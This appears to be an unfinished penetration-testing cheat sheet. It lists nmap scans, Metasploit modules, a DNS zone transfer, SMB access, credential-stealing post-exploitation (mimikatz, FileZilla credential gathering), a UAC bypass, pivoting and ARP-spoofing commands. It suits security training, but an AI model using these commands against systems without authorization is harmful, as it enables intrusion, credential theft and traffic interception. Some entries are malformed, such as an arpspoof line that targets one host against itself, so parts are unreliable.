## CheatSheet 

### 1.Scanning

#### 1.1 Most used nmap command
    - scan -Pn -sn TARGET                 : Search all alive host with or without open ports 
    - scan -sV -n TARGET                  : Fingerprint all exposed services
    - scan -sV -n TARGET -p SEVICE_PORT   : Fingerprint a specific exposed service
    - scan -O -n TARGET                   : Find Operating System

#### 1.2 Metasploit
    - auxiliary/scanner/smb/smb_version 
    - auxiliary/scanner/portscan/tcp
    
### 3.DNS Misconfiguration

    - dig @authorative_dns_server -t axfr DOMAIN      :    Exploiting zone transfer to display all subdomains
    - Exploiting zone transfer to display zone

### 2.SMB Misconfiguration
   #### 2.1 SMB Share
     Mount shared drive : 
       - Linux   : mount -t cifs -o user=USER,password=PWD,rw //IP/share
       - Windows : net use K: \\IPTarget\SharedDrive

   #### 2.2 Metasploit
      exploit/windows/smb/psexec
      exploit/windows/smb/smb_relay
      auxiliary/scanner/smb/smb_login
      auxiliary/scanner/smb/smb_enumshares

   #### 2.3 Check Null session (Anynomous Access)
       smbclient -L IPTarget
   

### 4.Exploitation


### 3.Post Exploitation

#### 3.0 Infor Gathering
run winenum
run arp_scanner –r TargetNetworkSubnet
run post/multi/gather/filezilla_client_cred

#### 3.1 Privilege Escalation

##### 3.1.1 All OS

      getsystem
      post/windows/gather/win_privs        : Check if UAC enabled
      exploit/windows/local/bypassuac      : Local exploit to bypass UAC

    - Method 1 : Search Local Exploit using MSF
    - Method 2 : Impersonate privileged users
       incognito
       mimikatz

##### 3.1.2 Via Windows Services 

    - Manually : 
        Search all services    
              ==> wmic service where 'NOT PathName like '%system32%' ' GET PathName, Name > list_srv.txt       
        For each service check if user can write in the service Path 
              ==> icacls “Path”

   - Using powerUp.ps1 script
   - 
        
##### 3.1.3 Specific Linux

#### 3.3 Pivoting
   route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
   portfarwarding (meterpreter) ==> portfwd victimeIP -p ServicePort add -L 127.0.0.1 -l LocalPort -r

### 5.Sniffing

#### 5.1 MiTM between vtcim1 & victm2 using arp poisonning
* arpspoof -i tap0 -t vic1_IP -r vic2_IP
*  arpspoof -i tap0 -t vic2_IP -r vic2_IP
